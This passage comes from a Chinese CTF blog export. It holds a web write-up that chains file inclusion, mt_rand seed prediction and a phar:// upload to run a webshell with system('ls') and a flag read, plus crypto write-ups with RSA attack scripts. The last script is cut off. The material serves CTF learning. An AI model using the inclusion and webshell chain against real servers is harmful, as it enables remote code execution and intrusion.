    <content type="text"><![CDATA[简介这是一道2017年NJCTF的250分的Web题，刚好在XCTF的题库里刷到了，便记录下来。 解题思路首先打开题目，看见是一个上传页面，只允许上传gif|jpg|jpeg|png，在上传了一张png图片后提示成功 但并没有什么有用信息，我便扫了一下目录，也没有什么有用的地方。之后查看url，发现是http://111.198.29.45:30139/?page=upload,是一个文件包含漏洞，我便构造http://111.198.29.45:30139/?page=php://filter/read=convert.base64-encode/resource=upload读取upload.php的源代码，顺便也把index.php的源代码读了下来 index.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt; &lt;meta charset="UTF-8"&gt; &lt;title&gt;Upload&lt;/title&gt; &lt;link rel="stylesheet" href="http://fortawesome.github.io/Font-Awesome/assets/font-awesome/css/font-awesome.css"&gt; &lt;link rel="stylesheet" href="CSS/upload.css"&gt;&lt;/head&gt;&lt;body&gt;&lt;div class="msg info" id="message"&gt; &lt;i class="fa fa-info-circle"&gt;&lt;/i&gt;please upload an IMAGE file (gif|jpg|jpeg|png)&lt;/div&gt;&lt;div class="container"&gt; &lt;form action="?page=upload" method="post" enctype="multipart/form-data" class="form"&gt; &lt;div class="file-upload-wrapper" id="file" data-text="Select an image!"&gt; &lt;label for="file-upload"&gt; &lt;input name="file-upload-field" type="file" class="file-upload-field" value="" id="file-upload"&gt;&lt;/label&gt; &lt;/div&gt; &lt;div class="div"&gt; &lt;input class="button" type="submit" value="Upload Image" name="submit"&gt; &lt;/div&gt; &lt;/form&gt; &lt;script src='http://cdnjs.cloudflare.com/ajax/libs/jquery/2.1.3/jquery.min.js'&gt;&lt;/script&gt; &lt;script src="js/filename.js"&gt;&lt;/script&gt;&lt;/div&gt;&lt;/body&gt;&lt;/html&gt;&lt;?phperror_reporting(0);session_start();if(isset($_GET['page']))&#123; $page=$_GET['page'];&#125;else&#123; $page=null;&#125;if(preg_match('/\.\./',$page))&#123; echo "&lt;div class=\"msg error\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;Attack Detected!&lt;/div&gt;"; die();&#125;?&gt;&lt;?phpif($page)&#123; if(!(include($page.'.php'))) &#123; echo "&lt;div class=\"msg error\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;error!&lt;/div&gt;"; exit; &#125;&#125;?&gt; upload.php1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?phperror_reporting(0);function show_error_message($message)&#123; die("&lt;div class=\"msg error\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");&#125;function show_message($message)&#123; echo("&lt;div class=\"msg success\" id=\"message\"&gt; &lt;i class=\"fa fa-exclamation-triangle\"&gt;&lt;/i&gt;$message&lt;/div&gt;");&#125;function random_str($length = "32")&#123; $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F", "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L", "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R", "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X", "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9"); $str = ''; for ($i = 1; $i &lt;= $length; ++$i) &#123; $ch = mt_rand(0, count($set) - 1); $str .= $set[$ch]; &#125; return $str;&#125;session_start();$reg='/gif|jpg|jpeg|png/';if (isset($_POST['submit'])) &#123; $seed = rand(0,999999999); mt_srand($seed); $ss = mt_rand(); $hash = md5(session_id() . $ss); setcookie('SESSI0N', $hash, time() + 3600); if ($_FILES["file"]["error"] &gt; 0) &#123; show_error_message("Upload ERROR. Return Code: " . $_FILES["file-upload-field"]["error"]); &#125; $check2 = ((($_FILES["file-upload-field"]["type"] == "image/gif") || ($_FILES["file-upload-field"]["type"] == "image/jpeg") || ($_FILES["file-upload-field"]["type"] == "image/pjpeg") || ($_FILES["file-upload-field"]["type"] == "image/png")) &amp;&amp; ($_FILES["file-upload-field"]["size"] &lt; 204800)); $check3=!preg_match($reg,pathinfo($_FILES['file-upload-field']['name'], PATHINFO_EXTENSION)); if ($check3) show_error_message("Nope!"); if ($check2) &#123; $filename = './uP1O4Ds/' . random_str() . '_' . $_FILES['file-upload-field']['name']; if (move_uploaded_file($_FILES['file-upload-field']['tmp_name'], $filename)) &#123; show_message("Upload successfully. File type:" . $_FILES["file-upload-field"]["type"]); &#125; else show_error_message("Something wrong with the upload..."); &#125; else &#123; show_error_message("only allow gif/jpeg/png files smaller than 200kb!"); &#125;&#125;?&gt; 其中主要的部分还是upload.php。关键是上传路径部分。会用mt_rand()生成随机数并用random_str()方法生成随机上传路径。我们写入一句话到0.php中，然后压缩成0.zip并上传，将上传的cookie置0，服务器会返回一个cookie=5a7ef55999b2628d526fe7bf36eef6ec,cmd5网站解密得1188348307 得到的cookie的解密可以用于预测mt_rand的seed，可以使用php_mt_seed 之后编写php解密脚本解密随机路径，由于上一步我们预测得到了许多结果，一个一个试试就可以了12345678910111213141516&lt;?php $set = array("a", "A", "b", "B", "c", "C", "d", "D", "e", "E", "f", "F", "g", "G", "h", "H", "i", "I", "j", "J", "k", "K", "l", "L", "m", "M", "n", "N", "o", "O", "p", "P", "q", "Q", "r", "R", "s", "S", "t", "T", "u", "U", "v", "V", "w", "W", "x", "X", "y", "Y", "z", "Z", "1", "2", "3", "4", "5", "6", "7", "8", "9"); $seed=634631518; mt_srand($seed); $ss = mt_rand(); $str=""; for ($i = 1; $i &lt;= 32; ++$i) &#123; $ch = mt_rand(0, count($set) - 1); $str .= $set[$ch]; &#125; echo $str;?&gt; 得到随机路径QxhcViJacOp5AZFFM1sG2hj4htW8cF7N访问http://111.198.29.45:30139/uP1O4Ds/QxhcViJacOp5AZFFM1sG2hj4htW8cF7N_0.png可以发现预测成功 接下来构造http://111.198.29.45:30139/?page=phar://uP1O4Ds/QxhcViJacOp5AZFFM1sG2hj4htW8cF7N_0.png/0,post的参数为ver=system(&#39;ls&#39;);,发现flag-Edi98vJF8hnIp.txt 其中page=phar://uP1O4Ds/QxhcViJacOp5AZFFM1sG2hj4htW8cF7N_0.png/0会被index.php中的include($page.&#39;.php&#39;)解析为include(&#39;phar://uP1O4Ds/QxhcViJacOp5AZFFM1sG2hj4htW8cF7N_0.png/0.php&#39;),也就会触发我们写进去的一句话 最后post的参数设为ver=system(&#39;cat flag-Edi98vJF8hnIp.txt&#39;);便可得到flag 总结还是挺有趣的，就是XCTF平台提交flag一直显示不对，好迷]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Write up</tag>
        <tag>Web</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenSSL解RSA的基本操作]]></title>
    <url>%2F2019%2F01%2F16%2FOpenSSL%E8%A7%A3RSA%E7%9A%84%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C%2F</url>
    <content type="text"><![CDATA[简介本文主要是记录如何用OpenSSL解RSA的题目. 1.PCTF我选取了一道XCTF训练营中的入门题目,这是一道来自于PCTF的题目。同时也附上题目下载地址 解题步骤1.从pubkey.pem中提取n和e1openssl rsa -pubin -text -modulus -in warmup -in pubkey.pem 结果如下: n: C2636AE5C3D8E43FFB97AB09028F1AAC6C0BF6CD3D70EBCA281BFFE97FBE30DDe: 65537 其中n转为10进制为87924348264132406875276140514499937145050893665602592992418171647042491658461 2.将n分解得到p和q利用yafu或factordb网站将n进行分解，得到 p: 319576316814478949870590164193048041239q: 275127860351348928173285174381581152299 3.用rsatool生成私钥文件:private.pem1python rsatool.py -o private.pem -e 65537 -p 275127860351348928173285174381581152299 -q 319576316814478949870590164193048041239 4.用private.pem解密flag.enc得到flag1openssl rsautl -decrypt -in flag.enc -inkey private.pem 2.AlexCTF-2017 Poor RSA1.从key.pub中读取公钥12345678$ openssl rsa -pubin -in key.pub -text -nooutPublic-Key: (399 bit)Modulus: 52:a9:9e:24:9e:e7:cf:3c:0c:bf:96:3a:00:96:61: 77:2b:c9:cd:f6:e1:e3:fb:fc:6e:44:a0:7a:5e:0f: 89:44:57:a9:f8:1c:3a:e1:32:ac:56:83:d3:5b:28: ba:5c:32:42:43Exponent: 65537 (0x10001) 2.将n分解得到p和qn比较小，可以用factordb.com网站分解p = 863653476616376575308866344984576466644942572246900013156919q = 965445304326998194798282228842484732438457170595999523426901 3.编写脚本构造priv.conf123456789101112131415161718192021222324252627import gmpy2p = 863653476616376575308866344984576466644942572246900013156919q = 965445304326998194798282228842484732438457170595999523426901e = 65537d = gmpy2.invert(e, (p - 1) * (q - 1))print '''asn1=SEQUENCE:rsa_key[rsa_key]version=INTEGER:0modulus=INTEGER:&#123;n&#125;pubExp=INTEGER:&#123;e&#125;privExp=INTEGER:&#123;e1&#125;p=INTEGER:&#123;p&#125;q=INTEGER:&#123;q&#125;e1=INTEGER:&#123;e1&#125;e2=INTEGER:&#123;e2&#125;coeff=INTEGER:&#123;coeff&#125;'''.format( n=p * q, e=e, p=p, q=q, e1=d % (p - 1), e2=d % (q - 1), coeff=gmpy2.invert(q, p),) 将打印出的结果写入priv.conf文件1$ ./build.py &gt; priv.conf 4.用priv.conf导出priv.der1$ openssl asn1parse -genconf priv.conf -out priv.der -noout 5.解码得到flag12$ base64 -d flag.b64 | openssl rsautl -decrypt -inkey priv.der -keyform derALEXCTF&#123;SMALL_PRIMES_ARE_BAD&#125;]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>OpenSSL</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[XNUCA-baby_crypto]]></title>
    <url>%2F2019%2F01%2F12%2FXNUCA-baby-crypto%2F</url>
    <content type="text"><![CDATA[简介这道题是2018年XNUCA的一道密码题，当时由于自己比较菜没做出来，期末考试考完之后看书提到了重合指数破解Vigenere密码的内容，就想起来了这道题并开始复现一下。过程比较艰辛(自己太菜了),自闭了两三天终于弄出来了，也算是很开心，并于现在记录下来以备以后查看。 题目描述题目给的描述如下： The 26 letters a, b, c, …, y, z correspond to the integers 0, 1, 2, …, 25len(key_a) = mlen(key_k) = nc[i] = (p[i] * key_a[i % m] + key_k[i % n]) % 26 p is plain text, only lowercase letters are refered to.c is encrypted text I have appended the flag at the end of plain text, the format of which is like ‘flagis……’Now you have the encrypted text, Good luck! 并且题目给了encrypted_message，里面是大约1w多长度的密文，要求我们还原出来 基本概念重合指数法（index of coincidence，又称一致检索法）是Wolfe Friendman于1920年提出的方法。它可以进一步地检验多表代换密码的密钥长度。关于它的知识可以看这篇文章和这个问答 解题思路首先我们要确定的是m和n多久循环一次，这里可以使用拟重合指数法确定。如果是Vigenere密码则是确定密钥长度。 12345678910111213141516171819202122232425262728#使用拟重合指数法确定秘钥长度：拟重合指数大于0.6为标志def length(Ciphertext): ListCiphertext=list(Ciphertext) Keylength=1 while True: #指数初始化为０ CoincidenceIndex = 0 #使用切片分组 for i in range(Keylength): Numerator = 0 PresentCipherList = ListCiphertext[i::Keylength] #使用集合去重，计算每一子密文组的拟重合指数 for Letter in set(PresentCipherList): Numerator += PresentCipherList.count(Letter) * (PresentCipherList.count(Letter)-1) CoincidenceIndex += Numerator/(len(PresentCipherList) * (len(PresentCipherList)-1)) #求各子密文组的拟重合指数的平均值 Average=CoincidenceIndex / Keylength Keylength += 1 #均值＞0.6即可退出循环 if Average &gt; 0.06: break Keylength -= 1 return Keylength 确定的重合指数为6，则m和n的最小公因数就是6。之后我们可以将密文分为6组，分别统计每个字母的字频，以便接下来的分析 123456789101112131415#确定每个分组的字频def frequency(Ciphertext,keylength): ListCiphertext = list(Ciphertext) for i in range(keylength): # 使用切片分组 PresentCipherList = ListCiphertext[i::keylength] print("第",i+1,"组") #遍历移动的位数 for m in range(26): #从a到z的字母 Letter = chr(65+m) #统计字母频率 LetterFrequency = round(PresentCipherList.count(Letter)/ len(PresentCipherList),8) #输出结果 print("字母",Letter,"的频率是",LetterFrequency) 在字频中我们需要用到的有三个数据1.e的字频(大约在0.12左右)2.t的字频(大约在0.8左右)3.a的字频(大约在0.8左右)因为这三个字母的字频是最大且最容易区分(远大于其他字母)的，我们也就可以利用它们进行分析而在每个分组中我们都能找到和e,a,t三个字母相近频率的字母，我们可以将它们对应的位置保存下来以便接下来的使用。其中由于t和a的频率相近,所以我们会将它俩视作一起处理的数据 123e=[8,11,17,22,16,3] #e的位置aORt1=[7,3,13,4,8,10] #t或a的位置1aORt2=[10,12,24,21,17,25] #t或a的位置2 其中位置指的是在字母表中的位置(a为0)，如e数组中的第一个元素8就代表字母表中的i，也就是在第一个分组中加密算法将字母e加密为了字母i 接下来我们可以通过题目给的加密表达式推出p[i]和key_k的表达式$$p[i] = ((c[i]-key_k[i \%n]) \times inv(key_a[i \%m])) mod (26)$$$$key_k[i \%n] = (c[i]-(p[i] \times key_a[i \%m])) mod (26)$$ 其中inv(x)表示x的逆元 我们接下来要对key_a和key_k进行爆破。其中两个数组都分别有6项，每一项的取值范围都在(0,25)之间，如果直接爆破，时间复杂度是特别大的但是由于key_a数组需要求逆元，所以我们便可以对key_a的取值范围进行缩小来减小复杂度。最终我们确定下来key_a的取值在(1,3,5,7,9,11,15,17,19,21,23,25)之中之后我们通过上面的公式将key_k算出来(其中通过我们频率统计中统计出的e的位置确定c[i]的取值),并通过a和t的位置验证key_k的取值是否成立，如果成立则根据此时的key_a和key_k数组解密密文,我们便可以寻找有意义的答案，从而得到flag1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#通过字频进行爆破def brute(Ciphertext): #初始化key_a和key_ks key_a=[0,0,0,0,0,0] key_k=[0,0,0,0,0,0] #逆元数组 #inv = [1,9,21,15,3,19,7,23,11,5,17,25] inv = [0,0,0,0,0,0] #由于key_a需要求逆元，所以挑选出了可求逆元的数 a = [1,3,5,7,9,11,15,17,19,21,23,25] #爆破key_a数组 for a1 in a: for a2 in a: for a3 in a: for a4 in a: for a5 in a: for a6 in a: key_a[0]=a1 key_a[1]=a2 key_a[2]=a3 key_a[3]=a4 key_a[4]=a5 key_a[5]=a6 #算出每个位置上的key_k(根据e的频率) for i in range(6): key_k[i]=(e[i]-(4*key_a[i]))%26 flag = 0 #算出每个位置上的key_k(根据a和t的频率) for i in range(6): temp1 = (aORt1[i]-(19*key_a[i]))%26 temp2 = (aORt2[i]-(19*key_a[i]))%26 #判断算出的结果是否都满足e,a,t的频率分布，如果不满足则寻找下一个 if temp1!=key_k[i] and temp2!=key_k[i]: flag=1 break #寻找下一个 if flag==1: continue #求逆元 inv[0]=gmpy2.invert(a1,26) inv[1]=gmpy2.invert(a2,26) inv[2]=gmpy2.invert(a3,26) inv[3]=gmpy2.invert(a4,26) inv[4]=gmpy2.invert(a5,26) inv[5]=gmpy2.invert(a6,26) #计数，每6个位一循环进行解密 count=0 res="" for text in Ciphertext: t = ord(text)-65 r = ((t-key_k[count])*(inv[count]))%26 res+=chr(r+97) if count==5: count=0 else: count+=1 print("找到了可能的值！") print("key_a数组为:",key_a) print("key_k数组为:",key_k) print ("最后结果为：",res) 最终我们得到了flag 最终代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136# -*- coding: utf-8 -*-# !/usr/bin/env pythonimport gmpy2e=[8,11,17,22,16,3] #e的位置aORt1=[7,3,13,4,8,10] #t或a的位置1aORt2=[10,12,24,21,17,25] #t或a的位置2#使用拟重合指数法确定秘钥长度：拟重合指数大于0.6为标志def length(Ciphertext): ListCiphertext=list(Ciphertext) Keylength=1 while True: #指数初始化为０ CoincidenceIndex = 0 #使用切片分组 for i in range(Keylength): Numerator = 0 PresentCipherList = ListCiphertext[i::Keylength] #使用集合去重，计算每一子密文组的拟重合指数 for Letter in set(PresentCipherList): Numerator += PresentCipherList.count(Letter) * (PresentCipherList.count(Letter)-1) CoincidenceIndex += Numerator/(len(PresentCipherList) * (len(PresentCipherList)-1)) #求各子密文组的拟重合指数的平均值 Average=CoincidenceIndex / Keylength Keylength += 1 #均值＞0.6即可退出循环 if Average &gt; 0.06: break Keylength -= 1 return Keylength#确定每个分组的字频def frequency(Ciphertext,keylength): ListCiphertext = list(Ciphertext) for i in range(keylength): # 使用切片分组 PresentCipherList = ListCiphertext[i::keylength] print("第",i+1,"组") #遍历移动的位数 for m in range(26): #从a到z的字母 Letter = chr(65+m) #统计字母频率 LetterFrequency = round(PresentCipherList.count(Letter)/ len(PresentCipherList),8) #输出结果 print("字母",Letter,"的频率是",LetterFrequency)#通过字频进行爆破def brute(Ciphertext): #初始化key_a和key_ks key_a=[0,0,0,0,0,0] key_k=[0,0,0,0,0,0] #逆元数组 #inv = [1,9,21,15,3,19,7,23,11,5,17,25] inv = [0,0,0,0,0,0] #由于key_a需要求逆元，所以挑选出了可求逆元的数 a = [1,3,5,7,9,11,15,17,19,21,23,25] #爆破key_a数组 for a1 in a: for a2 in a: for a3 in a: for a4 in a: for a5 in a: for a6 in a: key_a[0]=a1 key_a[1]=a2 key_a[2]=a3 key_a[3]=a4 key_a[4]=a5 key_a[5]=a6 #算出每个位置上的key_k(根据e的频率) for i in range(6): key_k[i]=(e[i]-(4*key_a[i]))%26 flag = 0 #算出每个位置上的key_k(根据a和t的频率) for i in range(6): temp1 = (aORt1[i]-(19*key_a[i]))%26 temp2 = (aORt2[i]-(19*key_a[i]))%26 #判断算出的结果是否都满足e,a,t的频率分布，如果不满足则寻找下一个 if temp1!=key_k[i] and temp2!=key_k[i]: flag=1 break #寻找下一个 if flag==1: continue #求逆元 inv[0]=gmpy2.invert(a1,26) inv[1]=gmpy2.invert(a2,26) inv[2]=gmpy2.invert(a3,26) inv[3]=gmpy2.invert(a4,26) inv[4]=gmpy2.invert(a5,26) inv[5]=gmpy2.invert(a6,26) #计数，每6个位一循环进行解密 count=0 res="" for text in Ciphertext: t = ord(text)-65 r = ((t-key_k[count])*(inv[count]))%26 res+=chr(r+97) if count==5: count=0 else: count+=1 print("找到了可能的值！") print("key_a数组为:",key_a) print("key_k数组为:",key_k) print ("最后结果为：",res)if __name__ == '__main__': #这里输入的值不能完全读入，需要分两批读入并解密 Ciphertext = input("输入密文：").upper() Keylength = length(Ciphertext) print("密文的重合长度是",Keylength) #确定字频 frequency(Ciphertext,keylength) #爆破 brute(Ciphertext) 其中需要注意的是input的密文太长一次读不完，我们在找出key_a和key_k的解之后可以将密文分成两份分别解密 后记XNUCA的题目质量还是很高的，密码这边除了一道RSA公模攻击(签到题)之外还有一道有关量子密码通信的BB84协议题目，但是当我看到别人的write up并了解完BB84协议之后题目环境已经没了，对我来说还是比较可惜的。希望以后密码这边我能少自闭点，争取做出更多的题。]]></content>
      <categories>
        <category>Crypto</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>Crypto</tag>
        <tag>Write up</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[RSA攻击综述]]></title>
    <url>%2F2019%2F01%2F09%2FRSA%E6%94%BB%E5%87%BB%E7%BB%BC%E8%BF%B0%2F</url>
    <content type="text"><![CDATA[简介RSA作为密码学中的代表，就和web中的php一样，被许多人不断研究，才有着今天这样广泛的使用程度。当然与此相对的也有许多的攻击方式被不断挖掘出来。这篇文章主要是对现阶段主流的RSA攻击方式进行总结，并配上exp脚本，以备以后的使用。 基本解法首先介绍的是RSA通常解法，也就是已知p,q,e和ciphertext的时候求d和plaintext 脚本如下：12345678910111213141516171819202122# -*- coding: utf-8 -*-import gmpy2print "素数p："p = input ()print "素数q："q = input ()n = p*qprint "公钥e："e = input ()print "密文ciphertext："ciphertext = input ()# d=invert(e,φ(n))，可见invert()函数解决 ed ≡ 1 (mod φ(n)) 问题d=gmpy2.invert(e,(p-1)*(q-1))print "私钥d：",dplaintext=pow(ciphertext, d, n)print "明文：",plaintext 对模数n的因子分解1.基本分解分解模数n是最直接的攻击方法，将n分解之后得到p,q，再通过p,q,e计算得到d，最后用d和n以及ciphertext求解plaintext分解模数n可以通过yafu或者factordb网站在线分解，之后使用常规解法求解即可 2.Pollard Rho rho算法其实是一种概率上的算法，虽然是靠概率，但是其准确率非常高（99.9%），更重要的是，该算法效率极高。其主要基于密码学当中的一个“生日悖论“来进行算法的设计。简单来讲就是，我们将N的两个因子x和y（就假设它有两个）从一大堆数里挑出来的概率非常小，但是如果我们挑满足x-y等于某个数的话，概率就要大很多。更进一步，如果我们找gcd(|x-y| ,N)呢？那么概率就会更大，就是这么个道理。关于Rho算法，要注意有可能会进入死循环，也就是说我们要在算法中对其进行判圈，具体的做法是，每次a=f(a)，再找一个b=f(f(b))，如果有一个时刻a=b那么就退出循环，因为b是以两倍的速度走得，当b追上了a，那么b至少已经走完一圈了。 脚本如下：1234567891011121314151617181920212223242526272829303132def gcd(a,b): while b != 0: t = b b = a % b a = t return adef Pollard_Rho(num): y = 2 x = 2 factor = 1 count = 0 if num==1: return 1 else: if num % 2 ==0: return 2 else: while factor == 1: if count %1000 == 0: print count x = (x*x + 1) % num y = (((y*y + 1) % num) ^ 2 + 1) % num factor = gcd( abs(x - y), num ) count += 1 return factorn = xxxres = Pollard_Rho(n)print (res) 3.Pollard P-1 这种方法是在p-1的素数分解式中不含有大于预定B值的素因数的情况下，找到一个基本的素数p，求出一个数的素因数。方法有点特殊，它只能应用在求整数n的一个素因子p，且p-1能被“小”因子整除的情况下，除此之外该方法无法正常应用。但是这个方法运用起来相当简单，所以在防止因式分解攻击时，必须考虑这一方法 脚本如下：123456789101112131415161718192021222324252627282930# Pollard's p-1 algorithm# https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm# this is really slow on stock python2, use either python3 or some JITerdef gcd(a,b): while b != 0: t = b b = a % b a = t return adef factor(n): a = 2 b = 2 while True: if b % 10000 == 0: print(b) a = pow(a, b, n) p = gcd(a - 1, n) if 1 &lt; p &lt; n: print("FOUND " + str(p)) return p b += 1n = xxxp = factor(n)print("p",p) 例题:ASIS-CTF-Finals-2017 Handicraft_RSA题目可以提取出加密脚本：12345678910111213141516171819202122232425262728293031323334353637#!/usr/bin/pythonfrom Crypto.Util.number import *from Crypto.PublicKey import RSAfrom secret import s, FLAGdef gen_prime(s): while True: r = getPrime(s) R = [r] t = int(5 * s / 2) + 1 for i in range(0, t): R.append(r + getRandomRange(0, 4 * s ** 2)) p = reduce(lambda a, b: a * b, R, 2) + 1 if isPrime(p): if len(bin(p)[2:]) == 1024: return pwhile True: p = gen_prime(s) q = gen_prime(s) n = p * q e = 65537 d = inverse(e, (p-1)*(q-1)) if len(bin(n)[2:]) == 2048: breakmsg = FLAGkey = RSA.construct((long(n), long(e), long(d), long(p), long(p)))for _ in xrange(s): enc = key.encrypt(msg, 0)[0] msg = encprint key.publickey().exportKey()print '-' * 76print enc.encode('base64')print '-' * 76 以及一些output 1234567891011121314151617-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq+m7iHurBa9G8ujEiTpZ71aHOVNhQXpd6jCQNhwMN3hD6JHkv0HSxmJwfGe0EnXDtjRraWmS6OYzT4+LSrXsz9IkWGzRlJ4lC7WHS8D3NWIWYHCP4TRt2N0TlWXWm9nFCrEXqQ3IWgYQpQvKzsdsetnIZJL1tf1wQzGE6rbkbvURlUBbzBSuidkmi0kY5Qxp2Jfb6OUI647zx2dPxJpDffSCNffVIDUYOvrgYxIhs5HmCF3XECC3VfaKtRceL5JM8R0qz5nVU2Ns8hPvSVP+7/i7G447cjW151si0joB7RpBplu44Vk8TXXDAk0JZdW6KwJn7ITaX04AAAAAAAAAAQIDAQAB-----END PUBLIC KEY---------------------------------------------------------------------------------eER0JNIcZYx/t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL/wnHtkAoNdCalQkpcbnZeAz4qeMX5GBmsO+BXyAKDueMA4uy3fw2k/dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS42o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI/jUA2BEo5WBoPzsCzwRmdr6QmJXTsau5BAQC5qdIkmCNq7+NLY1fjOmSEF/W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnXsh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA==---------------------------------------------------------------------------- 解题脚本:12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667import base64from Crypto.Util.number import *from Crypto.PublicKey import RSAdef gcd(a,b): while b != 0: t = b b = a % b a = t return a# Pollard's p-1 algorithm# https://en.wikipedia.org/wiki/Pollard%27s_p_%E2%88%92_1_algorithm# this is really slow on stock python2, use either python3 or some JITerdef factor(n): a = 2 b = 2 while True: if b % 10000 == 0: print(b) a = pow(a, b, n) p = gcd(a - 1, n) if 1 &lt; p &lt; n: print("FOUND " + str(p)) return p b += 1def decrypt(n, p, q): assert p * q == n e = 65537 d = inverse(e, (p-1)*(q-1)) key = RSA.construct((long(n), long(e), long(d), long(p), long(q))) msg = base64.b64decode("eER0JNIcZYx/t+7lnRvv8s8zyMw8dYspZlne0MQUatQNcnDL/wnHtkAoNdCalQkpcbnZeAz4qeMX5GBmsO+BXyAKDueMA4uy3fw2k/dqFSsZFiB7I9M0oEkqUja52IMpkGDJ2eXGj9WHe4mqkniIayS42o4p9b0Qlz754qqRgkuaKzPWkZPKynULAtFXF39zm6dPI/jUA2BEo5WBoPzsCzwRmdr6QmJXTsau5BAQC5qdIkmCNq7+NLY1fjOmSEF/W+mdQvcwYPbe2zezroCiLiPNZnoABfmPbWAcASVU6M0YxvnXsh2YjkyLFf4cJSgroM3Aw4fVz3PPSsAQyCFKBA==") for _ in xrange(20): enc = key.decrypt(msg) msg = enc print repr(msg)asciikey = """-----BEGIN PUBLIC KEY-----MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEAq+m7iHurBa9G8ujEiTpZ71aHOVNhQXpd6jCQNhwMN3hD6JHkv0HSxmJwfGe0EnXDtjRraWmS6OYzT4+LSrXsz9IkWGzRlJ4lC7WHS8D3NWIWYHCP4TRt2N0TlWXWm9nFCrEXqQ3IWgYQpQvKzsdsetnIZJL1tf1wQzGE6rbkbvURlUBbzBSuidkmi0kY5Qxp2Jfb6OUI647zx2dPxJpDffSCNffVIDUYOvrgYxIhs5HmCF3XECC3VfaKtRceL5JM8R0qz5nVU2Ns8hPvSVP+7/i7G447cjW151si0joB7RpBplu44Vk8TXXDAk0JZdW6KwJn7ITaX04AAAAAAAAAAQIDAQAB-----END PUBLIC KEY-----"""key = RSA.importKey(asciikey)n = int(key.n)# p = 139457081371053313087662621808811891689477698775602541222732432884929677435971504758581219546068100871560676389156360422970589688848020499752936702307974617390996217688749392344211044595211963580524376876607487048719085184308509979502505202804812382023512342185380439620200563119485952705668730322944000000001p = factor(key.n)q = n / pdecrypt(n, p, q) 4.已知e,d分解n在有的时候会有两道连续的RSA题目，第二道题的n和第一题的一样，但e不一样，这个时候就可以通过这个方法求解第二题参考资料算法如下： 实现代码如下：1234567891011121314151617181920import randomdef facN (N,e,d): k = e*d - 1 t = k x = 1 y = 1 while True: g = random.randint(2,N-1) y = gcd(x-1,N) if x &gt; 1 and y &gt; 1: print('find!') print(y) print(N/y) return y,N/y if t % 2 == 0: t = t/2 x = pow(g,t,N) else: t = k continue 例题:HITB-2017 Hack in the card IIWP参考此篇文章这道题的前一道相关题在本文章的侧信道攻击一栏的例题中题目给出了新的公钥文件 publickey.pem和密文 密文1016d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977 我们通过提取新的公钥文件中的N和e可以发现N没有变但是e变了，所以我们就可以通过前一题得到的N，e和d分解出p和q，然后算出新的d并解密密文 解题脚本如下:123456789101112131415161718192021222324252627282930313233343536373839404142import randomimport gmpy2def gcd(a,b): if a==0: return 0 while b != 0: t = b b = a % b a = t return adef facN (N,e,d): k = e*d - 1 t = k x = 1 y = 1 while True: g = random.randint(2,N-1) y = gcd(x-1,N) if x &gt; 1 and y &gt; 1: print('find!') print(y) print(N/y) return y,N/y if t % 2 == 0: t = t/2 x = pow(g,t,N) else: t = k continue m = 0x16d1d26a470fad51d52e5f3e90075ab77df69d2fb39905fe634ded81d10a5fd10c35e1277035a9efabb66e4d52fd2d1eaa845a93a4e0f1c4a4b70a0509342053728e89e977cfb9920d5150393fe9dcbf86bc63914166546d5ae04d83631594703db59a628de3b945f566bdc5f0ca7bdfa819a0a3d7248286154a6cc5199b99708423d0749d4e67801dff2378561dd3b0f10c8269dbef2630819236e9b0b3d3d8910f7f7afbbed29788e965a732efc05aef3194cd1f1cff97381107f2950c935980e8954f91ed2a653c91015abea2447ee2a3488a49cc9181a3b1d44f198ff9f0141badcae6a9ae45c6c75816836fb5f331c7f2eb784129a142f88b4dc22a0a977n = 